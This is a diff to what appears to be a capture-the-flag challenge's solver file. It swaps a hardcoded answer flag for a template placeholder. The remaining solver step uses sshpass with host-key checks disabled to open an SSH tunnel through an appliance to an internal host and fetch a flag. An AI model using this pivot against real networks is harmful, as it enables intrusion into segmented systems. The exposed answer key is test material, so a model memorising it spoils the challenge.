@@ -32,9 +32,9 @@ solver:
     expect: OCR{
   - name: Pivot through the appliance and retrieve the flag
     command: PIP=$(sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR {cred.analyst.user}@{target.appliance} "nslookup protected" | sed -n 's/^Address:[[:space:]]*//p' | tail -1); sshpass -p '{cred.analyst.pass}' ssh -f -N -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -L 18080:$PIP:80 {cred.analyst.user}@{target.appliance}; sleep 1; curl -s --noproxy '*' http://127.0.0.1:18080/flag
-    expect: OCR{appl1ance_s3gm3nt_p1v0t}
+    expect: '{flag}'
 expected_flag_count: 1
-expected_flag: OCR{appl1ance_s3gm3nt_p1v0t}
+expected_flag: '{flag}'
 forbidden_networks:
 - control-plane
 - database
